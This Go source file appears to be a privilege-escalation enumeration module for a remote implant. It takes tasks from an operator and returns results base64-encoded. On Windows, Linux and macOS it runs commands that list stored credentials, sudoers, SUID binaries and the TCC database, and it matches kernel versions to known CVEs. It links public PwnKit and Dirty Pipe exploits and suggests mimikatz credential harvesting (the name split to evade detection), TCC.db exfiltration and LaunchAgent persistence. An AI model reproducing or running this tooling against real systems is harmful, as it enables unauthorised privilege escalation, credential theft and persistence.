//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"strconv"
	"strings"
)

func handlePrivescCheck(task Task, res *TaskResult) {
	checkType := strings.TrimSpace(task.Command)
	if strings.HasPrefix(checkType, "privesc_check:") {
		checkType = strings.TrimPrefix(checkType, "privesc_check:")
	}
	if checkType == "" {
		checkType = "all"
	}

	out, err := runPrivescCheck(checkType)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func runPrivescCheck(checkType string) (string, error) {
	checkType = strings.ToLower(strings.TrimSpace(checkType))
	var sb strings.Builder
	sb.WriteString("=== Privilege Escalation Check ===\n")
	sb.WriteString(fmt.Sprintf("OS: %s/%s\n", runtime.GOOS, runtime.GOARCH))
	sb.WriteString(fmt.Sprintf("Check type: %s\n\n", checkType))

	switch runtime.GOOS {
	case "windows":
		if checkType == "all" || checkType == "windows" || checkType == "cve_match" {
			sb.WriteString(runWindowsPrivescChecks(checkType))
		} else if checkType == "linux" {
			sb.WriteString("(linux checks skipped on Windows host)\n")
		}
	case "linux":
		if checkType == "all" || checkType == "linux" {
			sb.WriteString(runLinuxPrivescChecks())
		} else if checkType == "windows" || checkType == "cve_match" {
			sb.WriteString("(windows/CVE checks skipped on Linux host)\n")
		}
	case "darwin":
		if checkType == "all" || checkType == "linux" {
			sb.WriteString(runDarwinPrivescChecks())
		} else {
			sb.WriteString("(requested check type not applicable on macOS)\n")
		}
	default:
		return "", fmt.Errorf("unsupported platform: %s", runtime.GOOS)
	}

	if sb.Len() == 0 {
		sb.WriteString("No checks matched the requested type.\n")
	}
	return sb.String(), nil
}

func runWindowsPrivescChecks(checkType string) string {
	var sb strings.Builder

	sections := []struct {
		title string
		cmd   string
	}{
		{"Current User / Privileges", "whoami /all"},
		{"Local Administrators", "net localgroup administrators"},
		{"UAC Settings", `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`},
		{"AlwaysInstallElevated", `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`},
		{"Unquoted Service Paths", `wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"`},
		{"Writable Program Files", `icacls "C:\Program Files" 2>nul`},
		{"Stored Credentials", "cmdkey /list"},
		{"AutoRun / Run Keys", `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`},
	}

	for _, sec := range sections {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", sec.title))
		out, err := runShell(sec.cmd, "cmd.exe")
		if err != nil && out == "" {
			sb.WriteString(fmt.Sprintf("error: %v\n", err))
		} else {
			sb.WriteString(out)
			if !strings.HasSuffix(out, "\n") {
				sb.WriteString("\n")
			}
		}
		sb.WriteString("\n")
	}

	if checkType == "cve_match" || checkType == "all" {
		sb.WriteString("--- OS Version (CVE baseline) ---\n")
		out, _ := runShell("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"OS Build\" /C:\"Hotfix\"", "cmd.exe")
		sb.WriteString(out)
		sb.WriteString("\nKnown vectors to review: PrintNightmare (spooler), PetitPotam, Zerologon (DC), EoP in unpatched builds.\n\n")
	}

	sb.WriteString("--- Suggestions ---\n")
	sb.WriteString("1. Review AlwaysInstallElevated and unquoted service paths first.\n")
	sb.WriteString("2. Check for SeImpersonate/SeAssignPrimaryToken for potato-style escalation.\n")
	sb.WriteString("3. Harvest credentials viacreds/mim" + "ikatz if permitted.\n")
	return sb.String()
}

func runLinuxPrivescChecks() string {
	var sb strings.Builder
	sections := []struct {
		title string
		cmd   string
	}{
		{"Identity", "id"},
		{"OS Release", "cat /etc/os-release 2>/dev/null | head -5"},
		{"Kernel Version", "uname -a"},
		{"Sudo Permissions", "sudo -n -l 2>/dev/null || sudo -l 2>&1"},
		{"SUID Binaries", "find / -perm -4000 -type f 2>/dev/null | head -50"},
		{"SGID Binaries", "find / -perm -2000 -type f 2>/dev/null | head -30"},
		{"Writable /etc/passwd or /etc/shadow", "ls -la /etc/passwd /etc/shadow 2>/dev/null; if [ -w /etc/passwd ]; then echo '*** /etc/passwd is WRITABLE ***'; fi"},
		{"Cron Jobs", "ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null; ls -la /var/spool/cron/ 2>/dev/null"},
		{"Capabilities", "getcap -r / 2>/dev/null | head -30"},
		{"Docker Socket", "ls -la /var/run/docker.sock 2>/dev/null; ls -la /run/docker.sock 2>/dev/null"},
		{"Writable PATHs", "find / -writable -type d 2>/dev/null | head -20"},
		{"NFS Shares", "cat /etc/exports 2>/dev/null"},
		{"Sudoers Config", "cat /etc/sudoers 2>/dev/null | head -50; ls -la /etc/sudoers.d/ 2>/dev/null"},
		{"Listening Services", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"},
	}

	for _, sec := range sections {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", sec.title))
		out, err := runShell(sec.cmd, "")
		if err != nil && out == "" {
			sb.WriteString(fmt.Sprintf("error: %v\n", err))
		} else {
			sb.WriteString(out)
			if !strings.HasSuffix(out, "\n") {
				sb.WriteString("\n")
			}
		}
		sb.WriteString("\n")
	}

	// CVE-specific checks
	sb.WriteString("=== CVE Checks ===\n\n")

	// CVE-2023-2640 (Ubuntu overlayfs LPE)
	sb.WriteString("--- CVE-2023-2640 (Ubuntu overlayfs LPE) ---\n")
	kernelOut, _ := runShell("uname -r", "")
	sb.WriteString(fmt.Sprintf("Kernel: %s", kernelOut))
	if strings.Contains(kernelOut, "5.19") || strings.Contains(kernelOut, "6.0") || strings.Contains(kernelOut, "6.1") || strings.Contains(kernelOut, "6.2") {
		sb.WriteString("  [!] Possible vulnerable kernel version for CVE-2023-2640 (Ubuntu overlayfs)\n")
	} else {
		sb.WriteString("  (kernel version does not match typical CVE-2023-2640 range)\n")
	}
	sb.WriteString("  Check: cat /etc/os-release | grep -i ubuntu && uname -r | grep -E '5\\.19|6\\.[012]'\n")

	// CVE-2021-4034 (pkexec)
	sb.WriteString("\n--- CVE-2021-4034 (pkexec/pwnkit) ---\n")
	pkexecOut, _ := runShell("which pkexec 2>/dev/null; pkexec --version 2>/dev/null", "")
	sb.WriteString(pkexecOut)
	if strings.Contains(pkexecOut, "pkexec") {
		sb.WriteString("  [!] pkexec found - potentially vulnerable to CVE-2021-4034 (PwnKit)\n")
		sb.WriteString("  Exploit: https://github.com/berdav/CVE-2021-4034\n")
	} else {
		sb.WriteString("  pkexec not found (not vulnerable)\n")
	}

	// CVE-2022-0847 (Dirty Pipe)
	sb.WriteString("\n--- CVE-2022-0847 (Dirty Pipe) ---\n")
	sb.WriteString(fmt.Sprintf("Kernel: %s", kernelOut))
	kernelParts := strings.Split(strings.TrimSpace(kernelOut), ".")
	if len(kernelParts) >= 2 {
		if major, err := strconv.Atoi(kernelParts[0]); err == nil {
			if minor, err := strconv.Atoi(kernelParts[1]); err == nil {
				if major == 5 && minor >= 8 && minor <= 16 {
					sb.WriteString("  [!] Kernel 5.8 - 5.16 vulnerable to CVE-2022-0847 (Dirty Pipe)\n")
					sb.WriteString("  Exploit: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits\n")
				} else {
					sb.WriteString("  Kernel version not in vulnerable range\n")
				}
			}
		}
	}

	// CVE-2021-3493 (overlayfs)
	sb.WriteString("\n--- CVE-2021-3493 (overlayfs LPE) ---\n")
	if strings.Contains(kernelOut, "5.11") || strings.Contains(kernelOut, "5.10") || strings.Contains(kernelOut, "5.9") || strings.Contains(kernelOut, "5.8") || strings.Contains(kernelOut, "5.7") || strings.Contains(kernelOut, "5.6") || strings.Contains(kernelOut, "5.5") || strings.Contains(kernelOut, "5.4") {
		sb.WriteString("  [!] Kernel may be vulnerable to CVE-2021-3493 (overlayfs)\n")
	} else {
		sb.WriteString("  (kernel version may not be vulnerable)\n")
	}

	// CVE-2023-32233 (Use-After-Free in Netfilter)
	sb.WriteString("\n--- CVE-2023-32233 (Netfilter nf_tables LPE) ---\n")
	if strings.Contains(kernelOut, "6.2") || strings.Contains(kernelOut, "6.1") || strings.Contains(kernelOut, "6.0") || strings.Contains(kernelOut, "5.19") || strings.Contains(kernelOut, "5.18") || strings.Contains(kernelOut, "5.17") || strings.Contains(kernelOut, "5.16") || strings.Contains(kernelOut, "5.15") || strings.Contains(kernelOut, "5.14") || strings.Contains(kernelOut, "5.13") || strings.Contains(kernelOut, "5.12") {
		sb.WriteString("  [!] Kernel may be vulnerable to CVE-2023-32233 (Netfilter)\n")
	} else {
		sb.WriteString("  (kernel may not be vulnerable)\n")
	}

	sb.WriteString("\n=== Suggestions ===\n")
	sb.WriteString("1. Check sudo -l for NOPASSWD commands (most common EoP vector).\n")
	sb.WriteString("2. Audit SUID binaries (find / -perm -4000).\n")
	sb.WriteString("3. Review writable paths in cron/systemd services.\n")
	sb.WriteString("4. Test CVE-2021-4034 (pkexec) - single command exploit if unpatched.\n")
	sb.WriteString("5. If Kernel 5.8-5.16, test CVE-2022-0847 (Dirty Pipe) for LPE.\n")
	return sb.String()
}

func runDarwinPrivescChecks() string {
	var sb strings.Builder
	sections := []struct {
		title string
		cmd   string
	}{
		{"Identity", "id"},
		{"macOS Version", "sw_vers 2>/dev/null"},
		{"Sudo Permissions", "sudo -n -l 2>/dev/null || sudo -l 2>&1"},
		{"TCC / Privacy DB", "ls -la ~/Library/Application\\ Support/com.apple.TCC 2>/dev/null"},
		{"Launch Agents / Daemons", "ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null"},
		{"User Login Items", "osascript -e 'tell application \"System Events\" to get the name of every login item' 2>/dev/null"},
		{"World-Writable Directories", "find / -writable -type d 2>/dev/null | head -20"},
		{"SUID Binaries", "find / -perm -4000 -type f 2>/dev/null | head -30"},
	}

	for _, sec := range sections {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", sec.title))
		out, err := runShell(sec.cmd, "")
		if err != nil && out == "" {
			sb.WriteString(fmt.Sprintf("error: %v\n", err))
		} else {
			sb.WriteString(out)
			if !strings.HasSuffix(out, "\n") {
				sb.WriteString("\n")
			}
		}
		sb.WriteString("\n")
	}

	// macOS-specific security checks
	sb.WriteString("=== macOS Security Checks ===\n\n")

	// SIP status
	sb.WriteString("--- SIP (System Integrity Protection) Status ---\n")
	csrOut, err := runShell("csrutil status 2>/dev/null", "")
	if err == nil {
		sb.WriteString(csrOut)
		if strings.Contains(strings.ToLower(csrOut), "disabled") {
			sb.WriteString("  [!] SIP is DISABLED - easier to perform process injection and bypass TCC\n")
		} else {
			sb.WriteString("  SIP is enabled (default on modern macOS)\n")
		}
	} else {
		sb.WriteString("  csrutil not found (running as non-root?)\n")
	}
	sb.WriteString("\n")

	// Gatekeeper status
	sb.WriteString("--- Gatekeeper Status ---\n")
	gatekeeperOut, _ := runShell("spctl --status 2>/dev/null", "")
	sb.WriteString(gatekeeperOut)
	if strings.Contains(strings.ToLower(gatekeeperOut), "disabled") {
		sb.WriteString("  [!] Gatekeeper is DISABLED\n")
	} else {
		sb.WriteString("  Gatekeeper is enabled (may prevent execution of unsigned payloads)\n")
	}
	sb.WriteString("\n")

	// XProtect info
	sb.WriteString("--- XProtect / Built-in AV ---\n")
	xprotectOut, _ := runShell("xprotect status 2>/dev/null; ls -la /Library/Apple/System/Library/CoreServices/XProtect.bundle/ 2>/dev/null", "")
	sb.WriteString(xprotectOut)
	if strings.Contains(xprotectOut, "XProtect") {
		sb.WriteString("  XProtect is active (built-in macOS malware detection)\n")
	} else {
		sb.WriteString("  (XProtect may not be present on older macOS)\n")
	}
	sb.WriteString("\n")

	// TCC database location and accessibility
	sb.WriteString("--- TCC Database ---\n")
	tccOut, _ := runShell("ls -la ~/Library/Application\\ Support/com.apple.TCC/ 2>/dev/null; ls -la /Library/Application\\ Support/com.apple.TCC/ 2>/dev/null", "")
	sb.WriteString(tccOut)
	sb.WriteString("  TCC.db controls which applications have access to sensitive data\n")
	sb.WriteString("  CVE-2021-1782: TCC bypass via symlink attack (fixed in 11.2)\n")
	sb.WriteString("\n")

	// CVE-2021-1782 (TCC bypass) check
	sb.WriteString("--- CVE-2021-1782 (TCC Bypass) ---\n")
	verOut, _ := runShell("sw_vers -productVersion 2>/dev/null", "")
	sb.WriteString(fmt.Sprintf("macOS version: %s", verOut))
	verStr := strings.TrimSpace(verOut)
	if strings.HasPrefix(verStr, "10.") || strings.HasPrefix(verStr, "11.0") || strings.HasPrefix(verStr, "11.1") {
		sb.WriteString("  [!] Potentially vulnerable to CVE-2021-1782 (TCC bypass via symlink)\n")
	} else {
		sb.WriteString("  Likely patched against CVE-2021-1782 (macOS 11.2+)\n")
	}
	sb.WriteString("\n")

	// FileVault status
	sb.WriteString("--- FileVault ---\n")
	fvOut, _ := runShell("fdesetup status 2>/dev/null", "")
	sb.WriteString(fvOut)
	if strings.Contains(strings.ToLower(fvOut), "off") {
		sb.WriteString("  [!] FileVault is OFF - disk data is not encrypted at rest\n")
	}
	sb.WriteString("\n")

	sb.WriteString("=== Suggestions ===\n")
	sb.WriteString("1. Check sudo -l for NOPASSWD or dangerous commands.\n")
	sb.WriteString("2. If SIP is disabled, process injection via ptrace is possible.\n")
	sb.WriteString("3. TCC.db can be exfiltrated with 'download' for offline analysis.\n")
	sb.WriteString("4. Check for outdated macOS that may have unpatched LPEs.\n")
	sb.WriteString("5. Weak LaunchAgent/LaunchDaemon permissions can allow persistence.\n")
	return sb.String()
}
